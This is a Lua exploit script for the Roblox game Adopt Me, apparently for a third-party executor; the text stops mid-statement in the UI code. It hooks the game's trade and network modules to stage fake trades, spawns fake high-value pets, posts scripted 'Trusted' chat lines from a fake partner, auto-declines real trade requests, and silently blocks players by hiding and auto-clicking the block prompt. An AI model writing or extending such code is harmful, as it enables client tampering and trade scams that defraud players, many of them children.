--[[
    Trade Request UI Script — compact trade interface for Adopt Me.
    Features:
      • Mock trade with auto-decline of real incoming trades
      • Spectator count auto-shuffles every 5s while trade is open
      • High + Mid tier pet spawner (based on 2026 tier lists)
      • Spawned pets are properly equippable (ride/fly/mount near you)
      • Preset partner quick chats
      • Block-player (Ak76VapW-style, invisible, no flash)
      • Player list: fake players (pink) on top, real server players (green) below
      • ADD PET adds High + Mid tiers in ALL variants (MFR/NFR/FR/MF/NF/F/MR/NR/R/NO POTION)
      • REMOVE PET removes the last pet added by the FAKE partner
      • X on partner pet → waits 1.5s then removes pet (ONE chat message only)
      • Header text "alexbestomg on dc"
--]]

local Players           = game:GetService("Players")
local LocalPlayer       = Players.LocalPlayer
local HttpService       = game:GetService("HttpService")
local UserInputService  = game:GetService("UserInputService")
local VIM               = game:GetService("VirtualInputManager")
local CoreGui           = game:GetService("CoreGui")
local StarterGui        = game:GetService("StarterGui")
local GuiService        = game:GetService("GuiService")
local RunService        = game:GetService("RunService")
local TweenService      = game:GetService("TweenService")

pcall(function() setthreadidentity(2) end)

local DEFAULT_PLAYER_NAME = "AdoptMe_Fan"
local DEFAULT_PLAYER_ID   = 123456

local TRADE_TIMEOUT_DURATION     = 60
local AUTO_ACCEPT_DELAY          = 2
local SPECTATOR_SHUFFLE_INTERVAL = 5
local PARTNER_REMOVE_DELAY       = 1.5

local SPAWN_COUNT_PER_VARIANT = 2
local SPAWN_VARIANTS          = { "NFR", "FR", "R" }

local PARTNER_ADD_VARIANTS = {
    "MFR", "NFR", "FR",
    "MF",  "NF",  "F",
    "MR",  "NR",  "R",
    "NO POTION",
}

-- ============================================================================
-- High Tier Pets (S + A tiers из тир-листов 2026)
-- ============================================================================

local highTierPets = {
    -- S-tier grails (2019 limiteds)
    "Bat Dragon", "Shadow Dragon", "Giraffe", "Frost Dragon", "Owl",
    -- A-tier (strong demand)
    "Parrot", "Crow", "Evil Unicorn", "Arctic Reindeer",
    "Balloon Unicorn", "Giant Panda", "African Wild Dog",
    "Queen Bee", "Cerberus", "Guardian Lion", "Albino Monkey",
}

-- ============================================================================
-- Mid Tier Pets (B + C tiers + популярные mid-tier легендарки)
-- ============================================================================

local midTierPets = {
    "Kangaroo", "Turtle", "Diamond Ladybug", "Skele-Rex", "Dodo",
    "Turkey", "Shiba Inu", "Panda", "Elephant", "Rhino",
    "Cow", "Swan", "Polar Bear", "Horse", "Fennec Fox",
    "Arctic Fox", "Mermicorn", "Mini Pig", "Goose", "Crocodile",
    "Lion", "Blue Dog", "Pink Cat", "Frost Fury", "King Monkey",
    "Hedgehog", "Dalmatian", "Strawberry Shortcake Bat Dragon",
    "Chocolate Chip Bat Dragon", "Blazing Lion", "Diamond Butterfly",
    "Peppermint Penguin", "Sugar Glider", "Shark Puppy", "Goat",
    "Sheeeeep", "Lion Cub", "Nessie", "Hare", "Ram", "Yeti",
    "Meerkat", "Jellyfish", "Happy Clam", "Orchid Butterfly",
    "Many Mackerel", "Zombie Buffalo", "Fairy Bat Dragon",
    "Jekyll Hydra", "Undead Jousting Horse", "Frostbite Bear",
    "Silverback Gorilla", "Grim Dragon", "Cryptid", "Werewolf",
    "Cabbit", "Midnight Dragon", "Sakura Spirit", "Haetae",
    "Candyfloss Chick", "Pelican", "Hot Doggo", "Honey Badger",
}

-- ============================================================================
-- Custom player list
-- ============================================================================

local customUsers = {
    { displayName = "0071219",             userId = 5651733505 },
    { displayName = "a7ciq",               userId = 4785815547 },
    { displayName = "bottleofthewater1",   userId = 8997575790 },
    { displayName = "candyaregoated",      userId = 7474344877 },
    { displayName = "caticaaa",            userId = 531075038 },
    { displayName = "coolrainbow_dash2011",userId = 205386059 },
    { displayName = "crafredicra",         userId = 1068227568 },
    { displayName = "cris_24248",          userId = 2756771717 },
    { displayName = "crnzqn",              userId = 5837852011 },
    { displayName = "daisygirl6790",       userId = 3699358543 },
    { displayName = "danibanini_boi",      userId = 3823255098 },
    { displayName = "flowergirlbunny555",  userId = 1408366882 },
    { displayName = "fresh_fries984",      userId = 3814573204 },
    { displayName = "girllll_crazy",       userId = 8168180345 },
    { displayName = "landz_10",            userId = 1790233865 },
    { displayName = "ling_15master",       userId = 1847186417 },
    { displayName = "lol_xd141618",        userId = 4450334271 },
    { displayName = "luv_x111",            userId = 5495319707 },
    { displayName = "maryamcin",           userId = 1931527172 },
    { displayName = "mdz_1219",            userId = 5259042075 },
    { displayName = "memocaritamalvada",   userId = 2365311822 },
    { displayName = "moisesgattoperdida",  userId = 4773927754 },
    { displayName = "notsuperhero22321a",  userId = 2939736508 },
    { displayName = "nyaashka_lavki",      userId = 5183439499 },
    { displayName = "blueprint.lua",       userId = 1444201029 },
    { displayName = "rhae_mango333",       userId = 692474013 },
    { displayName = "sasas3013",           userId = 971287458 },
    { displayName = "silentscenes",        userId = 2352256611 },
    { displayName = "v4mp1ahz",            userId = 4263229599 },
    { displayName = "winklebort",          userId = 232192602 },
}
local CUSTOM_PLAYERS = customUsers

local PARTNER_PRESET_CHATS = {
    { Label = "Trusted",                       Message = "Trusted" },
    { Label = "Im followed",                   Message = "Im followed" },
    { Label = "TYYYY",                         Message = "TYYYY" },
    { Label = "Omg tysm you re so trusted",    Message = "Omg tysm you re so trusted" },
    { Label = "Tysm",                          Message = "Tysm" },
    { Label = "My dp is a bat dragon",         Message = "My dp is a bat dragon" },
    { Label = "What can i upgrade this into?", Message = "What can i upgrade this into?" },
    { Label = "Can i upgrade this?",           Message = "Can i upgrade this?" }
}

local spectatorCount     = 5
local selectedPlayerName = DEFAULT_PLAYER_NAME
local selectedPlayerId   = DEFAULT_PLAYER_ID

-- ============================================================================
-- Fsys / TradeApp
-- ============================================================================

local Fsys      = require(game.ReplicatedStorage:WaitForChild("Fsys"))
local UIManager = Fsys.load("UIManager")
local TradeApp  = UIManager.apps.TradeApp

local tracked_offer_items = nil

local _orig_overwrite = TradeApp._overwrite_local_trade_state
TradeApp._overwrite_local_trade_state = function(self, state, ...)
    if state then
        local offer = state.sender == LocalPlayer and state.sender_offer
            or (state.recipient == LocalPlayer and state.recipient_offer or nil)
        if offer and tracked_offer_items then
            offer.items = tracked_offer_items
        end
    else
        tracked_offer_items = nil
    end
    return _orig_overwrite(self, state, ...)
end

local _orig_change = TradeApp._change_local_trade_state
TradeApp._change_local_trade_state = function(self, changes, ...)
    local current = self.local_trade_state
    local key = current and (
        current.sender == LocalPlayer and "sender_offer"
        or (current.recipient == LocalPlayer and "recipient_offer" or nil)
    )
    if key then
        local patch = changes[key]
        if patch and patch.items then
            tracked_offer_items = patch.items
        end
    end
    return _orig_change(self, changes, ...)
end

local function is_mock_trade_state(state)
    if not state then return false end
    local id = tostring(state.trade_id or "")
    return id:sub(1, 13) == "visual_trade_"
end

local function is_mock_trade_active()
    return is_mock_trade_state(TradeApp:_get_local_trade_state())
end

-- ============================================================================
-- Auto-decline
-- ============================================================================

local function safeCall(fn)
    local ok, err = pcall(fn)
    if not ok then warn("[Auto-Decline] error:", err) end
end

task.spawn(function()
    task.wait(2)
    local RouterClient = Fsys.load("RouterClient")
    local remote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
    if not remote then return end

    local ok, connections = pcall(getconnections, remote.OnClientEvent)
    if not ok or not connections then return end

    remote.OnClientEvent:Connect(function(requestingPlayer)
        if is_mock_trade_active() then
            for _, c in ipairs(connections) do
                pcall(function() c:Disable() end)
            end
            safeCall(function()
                RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(requestingPlayer, false)
            end)
        end
    end)

    local _origDecline = TradeApp._decline_trade
    TradeApp._decline_trade = function(self, ...)
        for _, c in ipairs(connections) do
            pcall(function() c:Enable() end)
        end
        return _origDecline(self, ...)
    end
end)

-- ============================================================================
-- Block Player
-- ============================================================================

local function hideModalNode(node)
    pcall(function()
        if node:IsA("GuiObject") then node.BackgroundTransparency = 1 end
        if node:IsA("ImageLabel") or node:IsA("ImageButton") then node.ImageTransparency = 1 end
        if node:IsA("TextLabel") or node:IsA("TextButton") or node:IsA("TextBox") then node.TextTransparency = 1 end
        if node:IsA("UIStroke") then node.Transparency = 1 end
    end)
end

local function hideAllModalDescendants(modal)
    pcall(function()
        modal.BackgroundTransparency = 1
        for _, desc in ipairs(modal:GetDescendants()) do
            hideModalNode(desc)
        end
    end)
end

local function BlockPlayer(Selected)
    pcall(function() setthreadidentity(8) end)

    StarterGui:SetCore('PromptBlockPlayer', Selected)

    local startTime = tick()
    local modal = nil
    while not modal do
        RunService.Heartbeat:Wait()
        if tick() - startTime > 10 then
            pcall(function() setthreadidentity(2) end)
            return
        end
        local overlay = game:GetService('CoreGui'):FindFirstChild('FoundationOverlay')
        if overlay then
            modal = overlay:FindFirstChild("BlockingModalScreen", true)
        end
    end

    hideAllModalDescendants(modal)

    local posConn
    posConn = RunService.Heartbeat:Connect(function()
        pcall(function()
            if modal and modal.Parent then
                hideAllModalDescendants(modal)
            else
                posConn:Disconnect()
            end
        end)
    end)

    local blockBtn = nil

    pcall(function()
        blockBtn = modal.BlockingModalContainerWrapper.BlockingModal.AlertModal.AlertContents.Footer.Buttons['3']
    end)

    if not blockBtn then
        pcall(function()
            local buttonsContainer = modal:FindFirstChild("Buttons", true)
            if buttonsContainer then
                for _, btn in ipairs(buttonsContainer:GetChildren()) do
                    if btn:IsA('ImageButton') or btn:IsA('TextButton') then
                        local textLabel = btn:FindFirstChild("Text")
                        if textLabel and textLabel:IsA('TextLabel') and textLabel.Text == "Block" then
                            blockBtn = btn
                            break
                        end
                    end
                end
                if not blockBtn then
                    blockBtn = buttonsContainer:FindFirstChild('3')
                end
            end
        end)
    end

    if not blockBtn then
        pcall(function()
            for _, desc in ipairs(modal:GetDescendants()) do
                if desc:IsA('ImageButton') or desc:IsA('TextButton') then
                    local textChild = desc:FindFirstChild("Text")
                    if textChild and textChild:IsA('TextLabel') and textChild.Text == "Block" then
                        blockBtn = desc
                        break
                    end
                end
            end
        end)
    end

    if blockBtn then
        local attempts = 0
        while attempts < 20 do
            attempts = attempts + 1

            pcall(function()
                game:GetService('GuiService').SelectedObject = blockBtn
            end)
            task.wait()
            pcall(function()
                if game:GetService('GuiService').SelectedObject == blockBtn then
                    game:GetService('VirtualInputManager'):SendKeyEvent(true,  Enum.KeyCode.Return, false, game)
                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                end
            end)
            task.wait(0.1)

            pcall(function()
                local absPos  = blockBtn.AbsolutePosition
                local absSize = blockBtn.AbsoluteSize
                local cx = absPos.X + absSize.X / 2
                local cy = absPos.Y + absSize.Y / 2
                local vim = game:GetService('VirtualInputManager')
                vim:SendMouseButtonEvent(cx, cy, 0, true,  game, 1)
                task.wait()
                vim:SendMouseButtonEvent(cx, cy, 0, false, game, 1)
            end)

            pcall(function()
                if firesignal then firesignal(blockBtn.MouseButton1Click) end
            end)
            pcall(function()
                if fireclick then fireclick(blockBtn) end
            end)

            task.wait(0.2)

            local overlay = game:GetService('CoreGui'):FindFirstChild('FoundationOverlay')
            if not overlay or not overlay:FindFirstChild("BlockingModalScreen", true) then
                break
            end
        end
        pcall(function() game:GetService('GuiService').SelectedObject = nil end)
    end

    pcall(function() if posConn then posConn:Disconnect() end end)

    local timeout = tick() + 10
    while tick() < timeout do
        local overlay = game:GetService('CoreGui'):FindFirstChild('FoundationOverlay')
        if not overlay or not overlay:FindFirstChild("BlockingModalScreen", true) then
            break
        end
        RunService.Heartbeat:Wait()
    end

    pcall(function() setthreadidentity(2) end)
end

-- ============================================================================
-- Helpers
-- ============================================================================

local function formatPetName(petKind)
    return petKind:gsub("_", " "):gsub("(%a)([%w_']*)", function(first, rest)
        return first:upper() .. rest:lower()
    end)
end

local function getPetRarityLabel(properties)
    if properties.mega_neon and properties.flyable and properties.rideable then return "MFR"
    elseif properties.mega_neon and properties.flyable then return "MF"
    elseif properties.mega_neon and properties.rideable then return "MR"
    elseif properties.mega_neon then return "M"
    elseif properties.neon and properties.flyable and properties.rideable then return "NFR"
    elseif properties.neon and properties.flyable then return "NF"
    elseif properties.neon and properties.rideable then return "NR"
    elseif properties.neon then return "N"
    elseif properties.flyable and properties.rideable then return "FR"
    elseif properties.flyable then return "F"
    elseif properties.rideable then return "R"
    else return "NO POTION" end
end

local function createUICorner(parent, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius)
    c.Parent = parent
    return c
end

local function createUIStroke(parent, color, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Color = color
    s.Thickness = thickness or 1
    s.Transparency = transparency or 0
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = parent
    return s
end

-- ============================================================================
-- build_pet_properties
-- ============================================================================

local function build_pet_properties(petType)
    petType = petType or "NO POTION"
    local mega = petType:find("M") ~= nil
    local neon = (not mega) and petType:find("N") ~= nil
    local fly  = petType:find("F") ~= nil
    local ride = petType:find("R") ~= nil
    return {
        flyable    = fly,
        rideable   = ride,
        neon       = neon,
        mega_neon  = mega,
        potionType = petType,
        age        = math.random(1, 2000000)
    }
end

local function normalize_name(s)
    return s:lower():gsub("[%s%-_]+", "")
end

local function findPetInDB(petName)
    local InventoryDB = Fsys.load("InventoryDB")
    local target_norm = normalize_name(petName)
    local exact, fuzzy

    for category, entries in pairs(InventoryDB) do
        if category == "pets" then
            for id, pet_data in pairs(entries) do
                local data_name = pet_data.name or ""
                if data_name == petName then
                    exact = pet_data
                    if not exact.id then exact.id = id end
                    break
                elseif normalize_name(data_name) == target_norm and not fuzzy then
                    fuzzy = pet_data
                    if not fuzzy.id then fuzzy.id = id end
                end
            end
            break
        end
    end
    local result = exact or fuzzy
    if result and not result.id then
        result.id = result.kind or result.name
    end
    return result
end

-- ============================================================================
-- Equip system
-- ============================================================================

local InventoryDB  = Fsys.load("InventoryDB")
local ClientData   = Fsys.load("ClientData")
local RouterClient = Fsys.load("RouterClient")

local items        = Fsys.load("KindDB")
local petRigsMod   = Fsys.load("new:PetRigs")
local animationMgr = Fsys.load("AnimationManager")
local PetData = { downloader = Fsys.load("DownloadClient"), petModels = {} }

local function getPetModel(kind)
    if PetData.petModels[kind] then return PetData.petModels[kind] end
    local ok, streamed = pcall(function()
        return PetData.downloader.promise_download_copy("Pets", kind):expect()
    end)
    if ok and streamed then
        PetData.petModels[kind] = streamed
        return streamed
    end
    return nil
end

local function updateClientData(key, action)
    local data = ClientData.get(key)
    local cloned = table.clone(data)
    ClientData.predict(key, action(cloned))
end

local function findIndexBy(array, finder)
    for i, v in pairs(array) do if finder(v, i) then return i end end
end

local SC = {
    petModels = {},
    pets      = {},
    equippedPet = nil,
    mountedPet  = nil,
    currentMountTrack = nil,
}

local RARITY_ORDER = { legendary = 900000, ultra_rare = 700000, rare = 500000, uncommon = 300000, common = 100000 }
local rarityCounters = { legendary = 0, ultra_rare = 0, rare = 0, uncommon = 0, common = 0 }

local function getRarityNewness(kind)
    local entry  = InventoryDB and InventoryDB.pets and InventoryDB.pets[kind]
    local rarity = (entry and entry.rarity) or "common"
    local base   = RARITY_ORDER[rarity] or 100000
    rarityCounters[rarity] = (rarityCounters[rarity] or 0) + 1
    return base + 99999 - rarityCounters[rarity]
end

local function neonify(model, entry)
    local petModel = model:FindFirstChild("PetModel") or model
    if not entry or not entry.neon_parts then return end
    for neonPart, config in pairs(entry.neon_parts) do
        local part = petRigsMod.get(petModel).get_geo_part(petModel, neonPart)
        if part then
            part.Material = config.Material or Enum.Material.Neon
            part.Color    = config.Color
        end
    end
end

local function megaify(model, entry)
    local petModel = model:FindFirstChild("PetModel") or model
    if not entry or not entry.neon_parts then return end
    for neonPart, config in pairs(entry.neon_parts) do
        local part = petRigsMod.get(petModel).get_geo_part(petModel, neonPart)
        if part then
            part.Material = Enum.Material.Neon
            local c = config.Color or Color3.fromRGB(170,0,255)
            local h,s,v = c:ToHSV()
            part.Color = Color3.fromHSV(h, math.min(s*1.3,1), math.min(v*1.4,1))
        end
    end
end

local function addPetWrapper(wrapper)
    updateClientData("pet_char_wrappers", function(list)
        wrapper.unique = #list + 1
        wrapper.index  = #list + 1
        list[#list + 1] = wrapper
        return list
    end)
end

local function addPetState(state)
    updateClientData("pet_state_managers", function(list)
        list[#list + 1] = state
        return list
    end)
end

local function removePetWrapper(uniqueId)
    updateClientData("pet_char_wrappers", function(list)
        local idx = findIndexBy(list, function(w) return w.pet_unique == uniqueId end)
        if not idx then return list end
        table.remove(list, idx)
        for i, w in pairs(list) do w.unique = i; w.index = i end
        return list
    end)
end

local function removePetState(uniqueId)
    local pet = SC.pets[uniqueId]
    if not pet or not pet.model then return end
    updateClientData("pet_state_managers", function(list)
        local idx = findIndexBy(list, function(s) return s.char == pet.model end)
        if not idx then return list end
        table.remove(list, idx)
        return list
    end)
end

local function setPetState(uniqueId, id)
    local pet = SC.pets[uniqueId]
    if not pet or not pet.model then return end
    updateClientData("pet_state_managers", function(list)
        local idx = findIndexBy(list, function(s) return s.char == pet.model end)
        if not idx then return list end
        local clone = table.clone(list)
        clone[idx] = table.clone(clone[idx])
        clone[idx].states = { { id = id } }
        return clone
    end)
end

local function clearPetState(uniqueId)
    local pet = SC.pets[uniqueId]
    if not pet or not pet.model then return end
    updateClientData("pet_state_managers", function(list)
        local idx = findIndexBy(list, function(s) return s.char == pet.model end)
        if not idx then return list end
        local clone = table.clone(list)
        clone[idx] = table.clone(clone[idx])
        clone[idx].states = {}
        return clone
    end)
end

local function clearPlayerState()
    updateClientData("state_manager", function(s)
        local c = table.clone(s)
        c.states = {}
        c.is_sitting = false
        return c
    end)
end

local function setPlayerState(id)
    updateClientData("state_manager", function(s)
        local c = table.clone(s)
        c.states = { { id = id } }
        c.is_sitting = true
        return c
    end)
end

local function attachPlayerToPet(petModel)
    local char = LocalPlayer.Character
    if not char or not char.PrimaryPart then return false end
    local ridePos = petModel:FindFirstChild("RidePosition", true)
    if not ridePos then return false end
    local att = Instance.new("Attachment")
    att.Parent = ridePos
    att.Position = Vector3.new(0, 1.237, 0)
    att.Name = "SourceAttachment"
    local rc = Instance.new("RigidConstraint")
    rc.Name = "StateConnection"
    rc.Attachment0 = att
    rc.Attachment1 = char.PrimaryPart.RootAttachment
    rc.Parent = char
    return true
end

local function unmount(uniqueId)
    local pet = SC.pets[uniqueId]
    if not pet or not pet.model then return end
    if SC.currentMountTrack then
        SC.currentMountTrack:Stop(); SC.currentMountTrack:Destroy()
    end
    local att = pet.model:FindFirstChild("SourceAttachment", true)
    if att then att:Destroy() end
    if LocalPlayer.Character then
        for _, d in pairs(LocalPlayer.Character:GetDescendants()) do
            if d:IsA("BasePart") and d:GetAttribute("HaveMass") then d.Massless = false end
        end
    end
    clearPetState(uniqueId)
    clearPlayerState()
    pet.model:ScaleTo(1)
    SC.mountedPet = nil
end

local function mount(uniqueId, playerState, petState)
    local pet = SC.pets[uniqueId]
    if not pet or not pet.model then return end
    if not LocalPlayer.Character or not LocalPlayer.Character.PrimaryPart then return end
    SC.mountedPet = uniqueId
    setPetState(uniqueId, petState)
    setPlayerState(playerState)
    pet.model:ScaleTo(2)
    attachPlayerToPet(pet.model)
    SC.currentMountTrack = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(
        animationMgr.get_track("PlayerRidingPet")
    )
    LocalPlayer.Character.Humanoid.Sit = true
    for _, d in pairs(LocalPlayer.Character:GetDescendants()) do
        if d:IsA("BasePart") and d.Massless == false then
            d.Massless = true
            d:SetAttribute("HaveMass", true)
        end
    end
    SC.currentMountTrack:Play()
end

local function ride(uniqueId) mount(uniqueId, "PlayerRidingPet", "PetBeingRidden") end
local function fly(uniqueId)  mount(uniqueId, "PlayerFlyingPet", "PetBeingFlown")  end

local function unequipPet(item)
    local pet = SC.pets[item.unique]
    if not pet or not pet.model then return end
    unmount(item.unique)
    removePetWrapper(item.unique)
    removePetState(item.unique)
    pet.model:Destroy()
    pet.model = nil
    SC.equippedPet = nil
end

local function equipPet(item)
    if SC.equippedPet then unequipPet(SC.equippedPet) end
    local src = getPetModel(item.kind)
    if not src then return end
    local model = src:Clone()
    model.Parent = workspace
    SC.pets[item.unique].model = model

    local entry = items[item.kind]
    if item.properties.mega_neon then megaify(model, entry)
    elseif item.properties.neon   then neonify(model, entry) end

    SC.equippedPet = item

    addPetWrapper({
        char = model,
        mega_neon = item.properties.mega_neon,
        neon      = item.properties.neon,
        player    = LocalPlayer,
        entity_controller = LocalPlayer,
        controller = LocalPlayer,
        rp_name = item.properties.rp_name or "",
        pet_trick_level = item.properties.pet_trick_level,
        pet_unique = item.unique,
        pet_id = item.kind,
        location = { full_destination_id = "housing", destination_id = "housing", house_owner = LocalPlayer },
        pet_progression = { age = math.random(1, 900000), percentage = math.random(0.01, 0.99) },
        are_colors_sealed = false,
        is_pet = true,
    })
    addPetState({
        char = model, player = LocalPlayer, store_key = "pet_state_managers",
        is_sitting = false, chars_connected_to_me = {}, states = {},
    })
end

do
    local oldGet = RouterClient.get

    local function mkInvoke(cb) return { InvokeServer = function(_, ...) return cb(...) end } end
    local function mkFire(cb)   return { FireServer   = function(_, ...) return cb(...) end } end

    local equipRemote = mkInvoke(function(uniqueId, metadata)
        local pet = SC.pets[uniqueId]
        if pet then equipPet(pet.data); return true, { action = "equip", is_server = true } end
        return oldGet("ToolAPI/Equip"):InvokeServer(uniqueId, metadata)
    end)
    local unequipRemote = mkInvoke(function(uniqueId)
        local pet = SC.pets[uniqueId]
        if pet then unequipPet(pet.data); return true, { action = "unequip", is_server = true } end
        return oldGet("ToolAPI/Unequip"):InvokeServer(uniqueId)
    end)
    local rideRemote = mkInvoke(function(item) ride(item.pet_unique) end)
    local flyRemote  = mkInvoke(function(item) fly(item.pet_unique)  end)
    local unmountFn  = mkInvoke(function() unmount(SC.mountedPet) end)
    local unmountEv  = mkFire(function() unmount(SC.mountedPet) end)

    RouterClient.get = function(name)
        if name == "ToolAPI/Equip"                then return equipRemote   end
        if name == "ToolAPI/Unequip"              then return unequipRemote end
        if name == "AdoptAPI/RidePet"             then return rideRemote    end
        if name == "AdoptAPI/FlyPet"              then return flyRemote     end
        if name == "AdoptAPI/ExitSeatStatesYield" then return unmountFn     end
        if name == "AdoptAPI/ExitSeatStates"      then return unmountEv     end
        return oldGet(name)
    end
end

-- ============================================================================
-- make_pet
-- ============================================================================

local function make_pet(source_pet, petType)
    local new_pet = table.clone(source_pet)
    new_pet.unique        = HttpService:GenerateGUID(false)
    new_pet.category      = "pets"
    new_pet.id            = new_pet.id or source_pet.id or new_pet.kind or new_pet.name
    new_pet.kind          = new_pet.kind or source_pet.kind or new_pet.id or new_pet.name
    new_pet.properties    = build_pet_properties(petType)
    new_pet.anti_stack_id = tostring(math.random(100000, 999999)) .. "-" .. tick()
    new_pet.favorite      = true
    new_pet.equipped      = false    new_pet.newness_order = new_pet.newness_order or getRarityNewness(new_pet.kind)

    local props = new_pet.properties
    props.age        = props.age        or math.random(1, 2000000)
    props.flyable    = props.flyable    or false
    props.rideable   = props.rideable   or false
    props.neon       = props.neon       or false
    props.mega_neon  = props.mega_neon  or false
    props.potionType = props.potionType or petType

    SC.pets[new_pet.unique] = { data = new_pet, model = nil }

    return new_pet
end

local function addPetToMySide(source_pet, petType)
    if not is_mock_trade_active() then return false end

    local state = TradeApp:_get_local_trade_state()
    local my_key = (state.recipient == LocalPlayer) and "recipient_offer"
                or (state.sender    == LocalPlayer) and "sender_offer"
                or "recipient_offer"

    local my_offer = state[my_key]
    local items    = my_offer.items or {}
    if #items >= 18 then return false end

    local new_pet = make_pet(source_pet, petType)
    table.insert(items, new_pet)

    TradeApp:_change_local_trade_state({
        [my_key] = {
            items       = items,
            negotiated  = my_offer.negotiated,
            confirmed   = my_offer.confirmed,
            player_name = my_offer.player_name
        }
    })
    TradeApp:refresh_all()
    TradeApp:_lock_trade_for_appropriate_time()
    return true
end

local function addPetToPartnerSide(petName, petType)
    if not is_mock_trade_active() then return false end

    local state = TradeApp:_get_local_trade_state()
    local partner_key = (state.recipient == LocalPlayer) and "sender_offer" or "recipient_offer"
    local partner_offer = state[partner_key]
    local items = partner_offer.items or {}
    if #items >= 18 then return false end

    local source_pet = findPetInDB(petName)
    if not source_pet then
        warn("Partner add failed: pet not found in DB: " .. petName)
        return false
    end

    local new_pet = make_pet(source_pet, petType)
    table.insert(items, new_pet)

    TradeApp:_change_local_trade_state({
        [partner_key] = {
            items       = items,
            negotiated  = partner_offer.negotiated,
            confirmed   = partner_offer.confirmed,
            player_name = partner_offer.player_name
        }
    })
    TradeApp:refresh_all()
    TradeApp:_lock_trade_for_appropriate_time()

    local rarityLabel   = getPetRarityLabel(new_pet.properties)
    local displayName   = source_pet.name or petName
    local formattedName = displayName:gsub("_", " "):gsub("(%a)([%w_']*)", function(f, r)
        return f:upper() .. r:lower()
    end)

    TradeApp:_render_message_in_trade_chat(
        nil,
        selectedPlayerName .. " added " .. rarityLabel .. " " .. formattedName,
        true, true
    )
    return true
end

-- ============================================================================
-- Spawner
-- ============================================================================

local function spawnPetList(petList, inventory, ordered_uuids, counter, in_trade)
    local total_injected    = 0
    local total_offer_added = 0
    local missing_pets      = {}

    local seen = {}
    local sorted = {}
    for _, name in ipairs(petList) do
        if not seen[name] then
            seen[name] = true
            table.insert(sorted, name)
        end
    end
    table.sort(sorted, function(a, b) return a:lower() < b:lower() end)

    for _, petName in ipairs(sorted) do
        local source_pet = findPetInDB(petName)
        if not source_pet then
            table.insert(missing_pets, petName)
        else
            for _ = 1, SPAWN_COUNT_PER_VARIANT do
                for _, variant in ipairs(SPAWN_VARIANTS) do
                    local new_pet = make_pet(source_pet, variant)
                    counter = counter + 1
                    new_pet.newness_order = counter

                    inventory.pets[new_pet.unique] = new_pet
                    table.insert(ordered_uuids, new_pet.unique)
                    total_injected = total_injected + 1

                    if in_trade then
                        if addPetToMySide(new_pet, variant) then
                            total_offer_added = total_offer_added + 1
                        end
                    end
                end
            end
        end
    end

    return counter, total_injected, total_offer_added, missing_pets
end

local function spawnAllPets()
    local inventory  = ClientData.get("inventory")
    if not inventory or not inventory.pets then
        warn("Spawn failed: no inventory")
        return
    end

    local in_trade = is_mock_trade_active()

    local ordered_uuids = {}
    local counter       = 0
    local total_injected     = 0
    local total_offer_added  = 0
    local all_missing        = {}

    local c1, i1, o1, m1 = spawnPetList(highTierPets, inventory, ordered_uuids, counter, in_trade)
    counter, total_injected, total_offer_added = c1, i1, o1
    for _, n in ipairs(m1) do table.insert(all_missing, n) end

    local c2, i2, o2, m2 = spawnPetList(midTierPets, inventory, ordered_uuids, counter, in_trade)
    counter, total_injected, total_offer_added = c2, i2, o2
    for _, n in ipairs(m2) do table.insert(all_missing, n) end

    local rebuilt = {}
    for _, uuid in ipairs(ordered_uuids) do
        if inventory.pets[uuid] then
            rebuilt[uuid] = inventory.pets[uuid]
        end
    end
    for uuid, pet in pairs(inventory.pets) do
        if not rebuilt[uuid] then
            rebuilt[uuid] = pet
        end
    end
    inventory.pets = rebuilt

    pcall(function() ClientData.set("inventory", inventory) end)
    pcall(function()
        local ui = Fsys.load("UIManager")
        if ui and ui.refresh_all then ui.refresh_all() end
    end)

    print(("Spawn: injected %d pets%s")
        :format(total_injected,
                in_trade and (" (" .. total_offer_added .. " added to offer)") or ""))

    if #all_missing > 0 then
        warn("Pets not found in InventoryDB: " .. table.concat(all_missing, ", "))
    end
end

-- ============================================================================
-- UI
-- ============================================================================

local PALETTE = {
    panel         = Color3.fromRGB(22, 24, 34),
    panelTop      = Color3.fromRGB(36, 40, 58),
    panelBottom   = Color3.fromRGB(18, 20, 28),
    panelStroke   = Color3.fromRGB(92, 102, 142),
    headerTop     = Color3.fromRGB(82, 102, 168),
    headerBottom  = Color3.fromRGB(40, 50, 88),
    section       = Color3.fromRGB(32, 35, 50),
    sectionTitle  = Color3.fromRGB(54, 59, 84),
    sectionStroke = Color3.fromRGB(86, 94, 128),
    listBg        = Color3.fromRGB(24, 27, 38),
    button        = Color3.fromRGB(60, 66, 96),
    buttonHover   = Color3.fromRGB(88, 96, 136),
    green         = Color3.fromRGB(72, 170, 108),
    greenHover    = Color3.fromRGB(96, 200, 132),
    orange        = Color3.fromRGB(220, 130, 60),
    orangeHover   = Color3.fromRGB(240, 150, 84),
    purple        = Color3.fromRGB(140, 96, 210),
    purpleHover   = Color3.fromRGB(165, 122, 232),
    red           = Color3.fromRGB(200, 68, 68),
    redHover      = Color3.fromRGB(226, 90, 90),
    blue          = Color3.fromRGB(72, 118, 200),
    blueHover     = Color3.fromRGB(96, 144, 224),
    text          = Color3.fromRGB(240, 242, 255),
    textSoft      = Color3.fromRGB(180, 186, 210),
}

local COLOR_REAL = Color3.fromRGB(64, 170, 90)
local COLOR_FAKE = Color3.fromRGB(220, 90, 170)

local screenGui = Instance.new("ScreenGui")
screenGui.Name           = "TradeRequestButton"
screenGui.ResetOnSpawn   = false
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent         = LocalPlayer:WaitForChild("PlayerGui")

-- Чуть крупнее предыдущего (200x500, с прокруткой)
local controlPanel = Instance.new("Frame")
controlPanel.Name                   = "TradeControlPanel"
controlPanel.Size                   = UDim2.new(0, 200, 0, 500)
controlPanel.Position               = UDim2.new(0, 20, 0, 60)
controlPanel.BackgroundColor3       = PALETTE.panel
controlPanel.BackgroundTransparency = 0
controlPanel.BorderSizePixel        = 0
controlPanel.ZIndex                 = 5
controlPanel.Active                 = true
controlPanel.ClipsDescendants       = false
controlPanel.Parent                 = screenGui
createUICorner(controlPanel, 14)
createUIStroke(controlPanel, PALETTE.panelStroke, 1.5, 0.15)

local panelGradient = Instance.new("UIGradient")
panelGradient.Color = ColorSequence.new({
